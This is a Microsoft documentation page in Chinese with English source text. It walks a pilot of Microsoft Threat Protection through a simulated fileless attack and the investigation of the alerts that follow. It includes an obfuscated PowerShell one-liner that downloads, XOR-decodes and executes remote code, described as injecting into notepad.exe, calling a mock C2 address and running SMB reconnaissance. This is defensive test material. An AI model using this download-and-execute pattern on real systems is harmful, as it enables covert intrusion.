---
title: 執行 Microsoft 威脅防護攻擊模擬
description: 針對您的 Microsoft 威脅防護試驗專案執行攻擊模擬，以查看其展開及快速修正的方式。
keywords: Microsoft 威脅防護試驗攻擊類比，執行 Microsoft 威脅防護試驗攻擊類比，模擬 Microsoft 威脅防護、Microsoft 威脅防護試驗專案、網路安全性、高級持續威脅、企業安全性、裝置、裝置、身分識別、使用者、資料、應用程式、事件、自動化調查和修正，以及高級搜尋
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: 50b74cf46999c3ad52f536ba0dfe07508c993a39
ms.sourcegitcommit: 9a764c2aed7338c37f6e92f5fb487f02b3c4dfa1
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 10/13/2020
ms.locfileid: "48447080"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a><span data-ttu-id="b1ae0-104">執行 Microsoft 威脅防護攻擊模擬</span><span class="sxs-lookup"><span data-stu-id="b1ae0-104">Run your Microsoft Threat Protection attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


<span data-ttu-id="b1ae0-105">適用於：\*\*\*\*</span><span class="sxs-lookup"><span data-stu-id="b1ae0-105">**Applies to:**</span></span>
- <span data-ttu-id="b1ae0-106">Microsoft 威脅防護</span><span class="sxs-lookup"><span data-stu-id="b1ae0-106">Microsoft Threat Protection</span></span>
<br>
<table border="0" width="100%" align="center">
  <tr style="text-align:center;">
    <td align="center" style="width:25%; border:0;" >
      <a href= "https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-plan"> 
        <img src="../../media/mtp/plan.png" alt="Plan your pilot Microsoft Threat Protection project" title="規劃試驗 Microsoft 威脅防護專案" />
      <br/><span data-ttu-id="b1ae0-108">計畫 </a></span><span class="sxs-lookup"><span data-stu-id="b1ae0-108">Plan </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/prepare-mtpeval">
        <img src="../../media/mtp/prep.png" alt="Prepare your Microsoft Threat Protection trial lab or pilot environment" title="準備您的 Microsoft 威脅防護試用實驗室或試驗環境" />
      <br/><span data-ttu-id="b1ae0-110">準備 </a></span><span class="sxs-lookup"><span data-stu-id="b1ae0-110">Prepare </a></span></span><br>
    </td>
    <td align="center"bgcolor="#d5f5e3">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-simulate">
        <img src="../../media/mtp/run-sim.png" alt="Run your Microsoft Threat Protection attack simulations" title="執行 Microsoft 威脅防護攻擊模擬" />
      <br/><span data-ttu-id="b1ae0-112">模擬攻擊 </a></span><span class="sxs-lookup"><span data-stu-id="b1ae0-112">Simulate attack </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-close">
        <img src="../../media/mtp/close.png" alt="Close and summarize your Microsoft Threat Protection pilot" title="關閉並摘要您的 Microsoft 威脅防護試驗" />
      <br/><span data-ttu-id="b1ae0-114">關閉及摘要 </a></span><span class="sxs-lookup"><span data-stu-id="b1ae0-114">Close and summarize </a></span></span><br>
    </td>
  </tr>
  <tr>
    <td style="width:25%; border:0;">
   
    </td>
    <td valign="top" style="width:25%; border:0;">
    
</td>
    <td valign="top" style="width:25%; border:0;">

</td>    
    <td valign="top" style="width:25%; border:0;">

</td>
  </tr>
</table>

<span data-ttu-id="b1ae0-115">您目前是在攻擊模擬階段。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-115">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="b1ae0-116">在準備您的試驗環境之後，請及時測試 Microsoft 威脅防護事件管理，以及自動化調查和修正功能。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-116">After preparing your pilot environment, it’s time to test the Microsoft Threat Protection incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="b1ae0-117">我們將協助您模擬複雜的攻擊，利用高級技術從偵測中隱藏。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-117">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="b1ae0-118">攻擊會在網域控制站上列舉已開啟的伺服器消息區塊 (SMB) 會話，並檢索使用者裝置的最近 IP 位址。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-118">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="b1ae0-119">這種攻擊類別通常不會包含放在受害者裝置上的檔案，而只是在記憶體中。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-119">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="b1ae0-120">他們會使用現有的系統和系統管理工具，並將其程式碼插入系統進程，以隱藏其執行，這類行為可讓他們避開偵測，並在裝置上持續運作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-120">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="b1ae0-121">在此模擬中，我們的範例案例會從 PowerShell 腳本開始。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-121">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="b1ae0-122">使用者可能會欺騙執行腳本。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-122">A user might be tricked into running a script.</span></span> <span data-ttu-id="b1ae0-123">或者，腳本可能從先前感染的裝置遠端連線至另一部電腦，企圖在網路中移動橫向。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-123">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="b1ae0-124">偵測到這些腳本可能很困難，因為系統管理員也經常會以遠端方式執行腳本，以執行各種管理活動。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-124">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Fileless PowerShell 攻擊，處理常式植入和 SMB reconnaisance 攻擊圖表](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="b1ae0-126">在模擬過程中，攻擊會將程式碼插入看似合法的程式。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-126">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="b1ae0-127">此案例需要使用 notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-127">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="b1ae0-128">我們為模擬選擇此程式，但攻擊者很可能是以長期執行的系統進程為目標，例如 svchost.exe。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-128">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="b1ae0-129">然後，命令介面會繼續聯繫攻擊者的命令和控制項 (C2) server，以接收如何繼續的指示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-129">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="b1ae0-130">腳本會嘗試對網域控制站執行偵測查詢 (DC) 。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-130">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="b1ae0-131">偵測允許攻擊者取得最近使用者登入資訊的相關資訊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-131">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="b1ae0-132">一旦攻擊者取得這項資訊，他們就可以在網路中移動橫向，以取得特定的機密帳戶。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-132">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="b1ae0-133">為了獲得最佳結果，請盡可能遵循攻擊模擬指示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-133">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="b1ae0-134">類比環境需求</span><span class="sxs-lookup"><span data-stu-id="b1ae0-134">Simulation environment requirements</span></span>

<span data-ttu-id="b1ae0-135">由於您已在準備階段中設定試驗環境，因此請確定此案例有兩個裝置：測試裝置和網域控制站。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-135">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="b1ae0-136">請確認您的租使用者已啟用 microsoft 威脅 [防護的 Microsoft 威脅](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-136">Verify your tenant has [enabled Microsoft Threat Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2.  <span data-ttu-id="b1ae0-137">驗證測試網域控制站設定：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-137">Verify your test domain controller configuration:</span></span>

    - <span data-ttu-id="b1ae0-138">使用 Windows Server 2008 R2 或更新版本的裝置執行。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-138">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="b1ae0-139">測試網域控制站至 [Azure 高級威脅防護](https://docs.microsoft.com/azure/security-center/security-center-wdatp) ，並啟用 [遠端系統管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-139">The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="b1ae0-140">確認 [AZURE ATP 和 Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) 已啟用。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-140">Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="b1ae0-141">在您的網域上建立測試使用者–不需要系統管理員許可權。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-141">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="b1ae0-142">驗證 test device configuration：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-142">Verify test device configuration:</span></span>
 
    1.  <span data-ttu-id="b1ae0-143">使用 Windows 10 版本1903或更新版本的裝置執行。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-143">Device runs with Windows 10 version 1903 or a later version.</span></span>
    
    1.  <span data-ttu-id="b1ae0-144">測試裝置已加入測試網域。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-144">Test device is joined to the test domain.</span></span>
    
    1.  <span data-ttu-id="b1ae0-145">[開啟 Windows Defender 防毒軟體](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-145">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="b1ae0-146">如果您在啟用 Windows Defender 防病毒時遇到問題，請參閱此 [疑難排解主題](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-146">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    
    1.  <span data-ttu-id="b1ae0-147">確認測試裝置 [架至 Microsoft Defender 高級威脅防護 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-147">Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="b1ae0-148">如果您使用現有租使用者並實施裝置群組，請為測試裝置建立專用的裝置群組，並將它推入設定 UX 的最上層。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-148">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="b1ae0-149">執行模擬</span><span class="sxs-lookup"><span data-stu-id="b1ae0-149">Run the simulation</span></span>

<span data-ttu-id="b1ae0-150">若要執行攻擊案例模擬：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-150">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="b1ae0-151">使用測試使用者帳戶登入測試裝置。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-151">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="b1ae0-152">在測試裝置上開啟 [Windows PowerShell] 視窗。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-152">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="b1ae0-153">複製下列類比腳本：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-153">Copy the following simulation script:</span></span>

    ```powershell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```
    
    > [!NOTE]
    > <span data-ttu-id="b1ae0-154">如果您在網頁瀏覽器上開啟此檔，您可能會遇到複製完整文字但未遺失某些字元或引入額外分行符號的問題。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-154">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="b1ae0-155">下載這份檔，並在 Adobe Reader 上開啟它。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-155">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="b1ae0-156">出現提示時，請貼上並執行複製的腳本。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-156">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-157">如果您正在使用遠端桌面通訊協定 (RDP) 執行 PowerShell，請使用 RDP 用戶端中的 [輸入剪貼簿文字] 命令，因為 **CTRL + V** 熱鍵或右擊-paste 方法可能無法運作。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-157">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="b1ae0-158">最新版本的 PowerShell 有時候也不會接受該方法，您可能需要先在記憶體中複製到記事本，然後在虛擬機器中複製它，然後將它貼到 PowerShell 中。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-158">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="b1ae0-159">幾秒後， <i>notepad.exe</i> 將會開啟。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-159">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="b1ae0-160">模擬的攻擊程式碼會注入 notepad.exe。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-160">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="b1ae0-161">將自動產生的記事本實例保持開啟，以體驗整個案例。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-161">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="b1ae0-162">模擬的攻擊程式碼會嘗試 (模擬 C2 server) 中的外部 IP 位址進行通訊，然後透過 SMB 嘗試對網域控制站偵測偵測。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-162">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="b1ae0-163">當此腳本完成時，您會看到 PowerShell 主控台上顯示一則訊息。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-163">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="b1ae0-164">若要查看自動事件和回應功能的動作，請保持 notepad.exe 處理常式開啟。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-164">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="b1ae0-165">您會看到自動化的事件和回應停止 [記事本] 處理常式。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-165">You'll see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="b1ae0-166">調查事件</span><span class="sxs-lookup"><span data-stu-id="b1ae0-166">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-167">在您完成這項類比之前，請觀看下列影片，查看「事件管理」如何説明您將相關的警示放在一起，以供調查過程使用，您可以在入口網站中找到該程式，以及它如何協助您進行安全性作業：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-167">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="b1ae0-168">切換至 SOC 分析員的觀點，您現在可以開始在 Microsoft 365 的安全性中心入口網站上調查攻擊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-168">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="b1ae0-169">從任何裝置開啟 [Microsoft 365 安全性中心入口網站](https://security.microsoft.com/incidents) 事件佇列。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-169">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="b1ae0-170">從功能表流覽至 [ **事件** ]。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-170">Navigate to **Incidents** from the menu.</span></span> 

    ![Microsoft 365 安全性中心左邊的功能表所顯示之事件的螢幕擷取畫面](../../media/mtp/fig1.png)

3.  <span data-ttu-id="b1ae0-172">模擬攻擊的新事件會出現在事件佇列中。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-172">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![事件佇列的螢幕擷取畫面](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="b1ae0-174">以單一事件調查攻擊</span><span class="sxs-lookup"><span data-stu-id="b1ae0-174">Investigate the attack as a single incident</span></span>

<span data-ttu-id="b1ae0-175">Microsoft 威脅防護會將不同產品的分析和匯總全部關聯至一個事件實體。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-175">Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="b1ae0-176">如此一來，Microsoft 威脅防護會顯示更廣泛的攻擊案例，讓 SOC 分析員能夠瞭解並回應複雜的威脅。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-176">By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="b1ae0-177">此模擬期間產生的警示會與相同的威脅產生關聯，因此會自動匯總為單一事件。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-177">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="b1ae0-178">若要查看此事件：</span><span class="sxs-lookup"><span data-stu-id="b1ae0-178">To view the incident:</span></span>

1.  <span data-ttu-id="b1ae0-179">流覽至 [ **事件** ] 佇列。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-179">Navigate to the **Incidents** queue.</span></span>
 
    ![流覽功能表中的事件螢幕擷取畫面](../../media/mtp/fig1.png)

2.  <span data-ttu-id="b1ae0-181">按一下事件名稱左側的圓形以選取最新的專案。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-181">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="b1ae0-182">側邊面板會顯示有關該事件的其他資訊，包括所有相關的警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-182">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="b1ae0-183">每個事件都有唯一的名稱，它會根據其包含的警示屬性來描述它。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-183">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![類比期間匯總產生之警示的事件頁面的螢幕擷取畫面](../../media/mtp/fig4.png)

    <span data-ttu-id="b1ae0-185">儀表板中顯示的警示可根據服務資源進行篩選： Azure ATP、Microsoft Cloud App Security、Microsoft Defender ATP、Microsoft 威脅防護和 Office ATP。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-185">The alerts that show in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.</span></span>  

3.  <span data-ttu-id="b1ae0-186">選取 [ **開啟事件] 頁面** ，以取得有關事件的詳細資訊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-186">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="b1ae0-187">在 [ **事件** ] 頁面中，您可以看到與該事件相關的所有警示和資訊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-187">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="b1ae0-188">此資訊包含警示中所涉及的實體和資產、警示的偵測來源 (Azure ATP、EDR) ，以及連結在一起的原因。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-188">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="b1ae0-189">檢查事件警示清單會顯示攻擊的進展。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-189">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="b1ae0-190">您可以從這個視圖，查看並調查個別提醒。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-190">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="b1ae0-191">您也可以按一下右側功能表中的 [ **管理事件** ]，以標記事件、將其指派給您並新增批註。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-191">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![按一下管理事件之位置的螢幕擷取畫面](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="b1ae0-193">「管理事件」面板上的欄位的螢幕擷取畫面，您可以在其中標記事件、將其指派給您並新增批註</span><span class="sxs-lookup"><span data-stu-id="b1ae0-193">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="b1ae0-194">審閱產生的提醒</span><span class="sxs-lookup"><span data-stu-id="b1ae0-194">Review generated alerts</span></span> 

<span data-ttu-id="b1ae0-195">讓我們看一下模擬攻擊期間產生的一些警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-195">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-196">我們只會逐步完成模擬攻擊期間產生的一些警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-196">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="b1ae0-197">根據您測試裝置上所執行的 Windows 版本和 Microsoft 威脅防護產品，您可能會看到更多以稍有不同順序顯示的警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-197">Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![產生之提醒的螢幕擷取畫面](../../media/mtp/fig6.png) 


<span data-ttu-id="b1ae0-199">\*\*警示：觀察到的可疑程式注入 (來源： Microsoft Defender ATP EDR) \*\*</span><span class="sxs-lookup"><span data-stu-id="b1ae0-199">**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="b1ae0-200">高級攻擊者使用複雜且 stealthy 的方法，保存在記憶體中，並從偵測工具隱藏。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-200">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="b1ae0-201">其中一項常見的技術是在信任的系統進程中運作，而不是惡意的可執行檔，使偵測工具和安全性作業難以發現惡意的程式碼。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-201">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="b1ae0-202">若要讓 SOC 分析員能夠捕捉這些高級攻擊，Microsoft Defender ATP 中的深度記憶體感應器會提供我們的雲端服務，具有空前的跨進程程式碼注入技術。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-202">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="b1ae0-203">下圖顯示 Microsoft Defender ATP 如何在嘗試注入程式碼以 <i>notepad.exe</i>時，如何偵測及警示。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-203">The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![注入潛在惡意程式碼之警示的螢幕擷取畫面](../../media/mtp/fig7.png) 


<span data-ttu-id="b1ae0-205">\*\*警示：以無命令列引數執行過程所觀察到的意外行為 (來源： Microsoft Defender ATP EDR) \*\*</span><span class="sxs-lookup"><span data-stu-id="b1ae0-205">**Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="b1ae0-206">Microsoft Defender ATP 偵測通常是以最常見的攻擊技術屬性為目標。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-206">Microsoft Defender ATP detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="b1ae0-207">此方法可確保持續性並引發此列，以供攻擊者切換至更新的戰術。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-207">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="b1ae0-208">我們採用大規模的學習演算法，在組織和全球範圍內建立一般程式的正常行為，並在這些程式顯示反常行為時加以監視。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-208">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="b1ae0-209">這些反常行為通常表示已引進無關的程式碼，並在其他受信任的程式中執行。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-209">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="b1ae0-210">在此案例中，處理 <i>notepad.exe</i> 會顯示反常的行為，包括與外部位置的通訊。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-210">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="b1ae0-211">這項結果獨立于用於引入及執行惡意程式碼的特定方法。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-211">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="b1ae0-212">因為此警示是以需要其他後端處理的機器學習模型為基礎，所以在入口網站中看到此警示之前可能需要一些時間。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-212">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="b1ae0-213">請注意，警示詳細資料包含外部 IP 位址（即您可以做為資料透視以展開調查的指標）。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-213">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="b1ae0-214">選取 [警示處理常式] 樹狀目錄中的 IP 位址，以查看 [IP 位址詳細資料] 頁面。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-214">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![以無命令列引數執行程式時，未預期行為之警示的螢幕擷取畫面](../../media/mtp/fig8.png) 

<span data-ttu-id="b1ae0-216">下圖顯示 [選取的 IP 位址詳細資料] 頁面 (按一下警示處理樹狀目錄樹) 中的 [IP 位址]。</span><span class="sxs-lookup"><span data-stu-id="b1ae0-216">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
